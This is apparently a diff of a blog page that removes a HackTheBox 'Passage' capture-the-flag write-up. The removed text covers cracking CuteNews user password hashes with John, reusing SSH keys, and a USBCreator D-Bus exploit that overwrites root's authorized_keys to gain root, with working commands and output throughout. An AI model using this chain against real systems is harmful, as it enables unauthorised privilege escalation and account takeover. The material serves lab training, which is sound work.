-<p><img src="/images/placeholder.png" alt="image-20200906151237004" data-src="/images/HTB-Passage-Medium/image-20200906151237004.png" class="lazyload"></p>
-<p>Along the way we find out that CuteNews does not have database, all it’s data are store in PHP.</p>
-<p>For convivence, I zip the whole web folder and download it to local for more analysis.</p>
-<p>in cdata/users folder we found some base64</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]</span><br><span class="line">└─<span class="comment"># ls                                                                           </span></span><br><span class="line">09.php  16.php  32.php  42.php  5d.php  6c.php  73.php  7a.php  97.php  b0.php  c1.php  d4.php  d6.php  fb.php  lines</span><br><span class="line">0a.php  21.php  41.php  52.php  66.php  6e.php  77.php  8f.php  98.php  b8.php  c8.php  d5.php  e0.php  fc.php  users.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]</span><br><span class="line">└─<span class="comment"># cat 09.php</span></span><br><span class="line">&lt;?php die(<span class="string">'Direct call - access denied'</span>); ?&gt;</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319    </span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>We extract out all the base64 hash and decrypt it at one</p>
-<figure class="highlight makefile"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]</span><br><span class="line">└─<span class="comment"># cat * | grep -v '&lt;?php'                                                      </span></span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/images/placeholder.png" alt="image-20200906151626095" data-src="/images/HTB-Passage-Medium/image-20200906151626095.png" class="lazyload"></p>
-<p>we can see that is all serialized objects.</p>
-<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'name'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'admin'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'id'</span> =&gt; <span class="string">'1592483047'</span>,</span><br><span class="line">      <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>,</span><br><span class="line">      <span class="string">'acl'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">      <span class="string">'email'</span> =&gt; <span class="string">'nadav@passage.htb'</span>,</span><br><span class="line">      <span class="string">'pass'</span> =&gt; <span class="string">'7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1'</span>,</span><br><span class="line">      <span class="string">'lts'</span> =&gt; <span class="string">'1592487988'</span>,</span><br><span class="line">      <span class="string">'ban'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">      <span class="string">'cnt'</span> =&gt; <span class="string">'2'</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
-
-<p>it contains email and password hash.</p>
-<p>went to hash.org and we know it’s a sha256 hash.</p>
-<p>we collect all the hashes </p>
-<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">7144</span>a<span class="number">8</span>b<span class="number">531</span><span class="keyword">c</span><span class="number">27</span>a<span class="number">60</span>b<span class="number">51</span>d<span class="number">81</span>ae<span class="number">16</span>be<span class="number">3</span>a<span class="number">81</span>cef<span class="number">722e11</span>b<span class="number">43</span>a<span class="number">26</span>fde<span class="number">0</span>ca<span class="number">97</span>f<span class="number">9e1485</span>e<span class="number">1</span></span><br><span class="line"><span class="number">4</span>bdd<span class="number">0</span>a<span class="number">0</span>bb<span class="number">47</span>fc<span class="number">9</span>f<span class="number">66</span>cbf<span class="number">1</span>a<span class="number">8982</span>fd<span class="number">2</span>d<span class="number">344</span>d<span class="number">2</span>aec<span class="number">283</span>d<span class="number">1</span>afaebb<span class="number">4653</span>ec<span class="number">3954</span>dff<span class="number">88</span></span><br><span class="line">e<span class="number">26</span>f<span class="number">3e86</span>d<span class="number">1</span>f<span class="number">8108120723</span>ebe<span class="number">690e5</span>d<span class="number">3</span>d<span class="number">61628</span>f<span class="number">4130076</span>ec<span class="number">6</span>cb<span class="number">43</span>f<span class="number">16</span>f<span class="number">497273</span>cd</span><br><span class="line">f<span class="number">669</span>a<span class="number">6</span>f<span class="number">691</span>f<span class="number">98</span>ab<span class="number">0562356</span><span class="keyword">c</span><span class="number">0</span>cd<span class="number">5</span>d<span class="number">5e7</span>dcdc<span class="number">20</span>a<span class="number">07941</span><span class="keyword">c</span><span class="number">86</span>adcfce<span class="number">9</span>af<span class="number">3085</span>fbeca</span><br><span class="line"><span class="number">4</span>db<span class="number">1</span>f<span class="number">0</span>bfd<span class="number">63</span>be<span class="number">058</span>d<span class="number">4</span>ab<span class="number">04</span>f<span class="number">18</span>f<span class="number">65331</span>ac<span class="number">11</span>bb<span class="number">494</span>b<span class="number">5792</span><span class="keyword">c</span><span class="number">480</span>faf<span class="number">7</span>fb<span class="number">0</span><span class="keyword">c</span><span class="number">40</span>fa<span class="number">9</span><span class="keyword">cc</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>and we use john and rockyou to decrypt it </p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Linux/passage]</span><br><span class="line">└─<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 password</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])</span><br><span class="line">Warning: poor OpenMP scalability <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">atlanta1         (?)</span><br><span class="line">1g 0:00:00:01 DONE (2020-09-06 15:08) 0.8403g/s 12053Kp/s 12053Kc/s 48240KC/s (454579)..*7¡Vamos!</span><br><span class="line">Use the <span class="string">"--show --format=Raw-SHA256"</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>we got the password <strong>atlanta1</strong></p>
-<p>we manage su to <strong>paul</strong> account</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">paul@passage:/var/www/html/CuteNews/cdata$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">paul</span><br><span class="line">paul@passage:/var/www/html/CuteNews/cdata$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">paul@passage:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads         Music     Public     user.txt</span><br><span class="line">Documents  examples.desktop  Pictures  Templates  Videos</span><br><span class="line">paul@passage:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">3f0dfa31752b3222428868b631ebe589</span><br></pre></td></tr></tbody></table></figure>
-
-<p>After some enumeration</p>
-<p>authorized_keys only have one nadav value. That means key belongs nadav. <strong>This key can access to both nadav and paul</strong></p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">paul@passage:~/.ssh$ <span class="built_in">cat</span> authorized_keys </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>That means, nadav might have paul’s public key.</p>
-<p>We get the id_rsa key from paul and we are in</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Linux/passage]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa nadav@10.129.5.22</span></span><br><span class="line">load pubkey <span class="string">"id_rsa"</span>: invalid format</span><br><span class="line">Last login: Sun Sep  6 00:21:36 2020 from 10.10.14.6</span><br><span class="line">nadav@passage:~$ </span><br></pre></td></tr></tbody></table></figure>
-
-<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>After some enumeration from process list, we discover d-bus usbcreator is vulnerable to privilege escalation</p>
-<p><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">USBCreator D-Bus Privilege Escalation in Ubuntu Desktop</a></p>
-<p> We can directly overwrite arbitary files on the file system as root.</p>
-<p>Generate our own ssh key and write it to a file called <strong>ssh_key</strong></p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nadav@passage:~$ <span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuSKqfg/WNLTFhnw+oY9nBwgoBZm4pRY0ZJHBykTQ9tU2XAR2AE1Hqzkqho7D1/b1sfSLOM1h53vxHzMewMO+xGxQ4n3xdoQmHy+BUJ8igkFlG630Jbu6AOJPU2vigmqr9rxdPSZCk5443tp8p4se2C9k7mOoYNZtRsHTuvq4uHOCOvlIaehIGDiI2zoatklvWdQ4dUDERM4gKo5U4VJ05DteQydkQuBKRTx4zYnO0+Tepkk424Q6aCaalwTfjFJTpEYRMLQrK6sGcijDJL2U/gHIjah3o8bR6aA5jy40P+3mFwMTW2lKAz+dhuyrtrBkvbiDeyrXBxAiDq/G5aiMTBVQA9vrfl0fpUGA2gY8/VqcuJ0cKWhSc3pzLzHO8dnElQD7+VCnJqRsxKjRMngJ5zJmyoIF/DRQZ2klnnW1chrFhi+kmegJuiQACjQqMiG8xgFJqJqy/jKbMMhNoul1y21Dx3de/K4c1LBsvYd0OGeckbLk7KDbxQ0snnVzKLDU= ikonw"</span> &gt; ssh_key</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Next called the dbus to overwrite to root’s authorized_keys</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/ssh_key /root/.ssh/authorized_keys <span class="literal">true</span></span><br><span class="line">()</span><br></pre></td></tr></tbody></table></figure>
-
-<p>and we got root</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@10.129.5.22                                                                                      127 ⨯</span></span><br><span class="line">Last login: Sun Sep  6 02:23:55 2020 from 10.10.14.6</span><br><span class="line">root@passage:~<span class="comment"># cat root.txt &amp;&amp; whoami &amp;&amp; hostname</span></span><br><span class="line">ad8b45d6ef52d901382e54b0d3ecb4ad</span><br><span class="line">root</span><br><span class="line">passage</span><br></pre></td></tr></tbody></table></figure>
-
-
-<br>
-<br>
-<br>
-
-
-<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
-<br>
-<br>
-<br>
-
-<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/medium/">medium</a>           
-			
-		
-	</div>
-
-	<div class="article-bottom">
-		<a class="readmore" href="/2020/09/06/HTB-Passage/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
 
 	
 	
@@ -761,7 +743,7 @@
         </a>
     
 
-   <span class="page-number"> Page <strong>2</strong>, Posts <strong>29</strong>. </span>
+   <span class="page-number"> Page <strong>2</strong>, Posts <strong>33</strong>. </span>
 
     
         <a class="next" href="/page/3/"> 
